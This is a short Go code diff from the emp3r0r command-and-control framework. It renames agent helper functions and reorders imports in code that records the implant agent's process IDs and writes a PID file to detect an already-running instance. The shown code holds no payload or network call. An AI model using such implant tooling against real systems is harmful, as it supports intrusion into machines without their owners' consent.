@@ -1,17 +1,18 @@
 package agentutils
 
 import (
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"strconv"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// GetAgentProcess fill up info.emp3r0r_def.AgentProcess
-func GetAgentProcess() *def.AgentProcess {
+// getAgentProcess fill up info.emp3r0r_def.AgentProcess
+func getAgentProcess() *def.AgentProcess {
 	p := &def.AgentProcess{}
 	p.PID = os.Getpid()
 	p.PPID = os.Getppid()
@@ -21,8 +22,8 @@ func GetAgentProcess() *def.AgentProcess {
 	return p
 }
 
-// IsAgentRunningPID is there any emp3r0r agent already running?
-func IsAgentRunningPID() (bool, int) {
+// CheckExistingInstance is there any emp3r0r agent already running?
+func CheckExistingInstance() (bool, int) {
 	defer func() {
 		myPIDText := strconv.Itoa(os.Getpid())
 		if err := util.WriteFileAgent(common.RuntimeConfig.PIDFile, []byte(myPIDText), 0o600); err != nil {
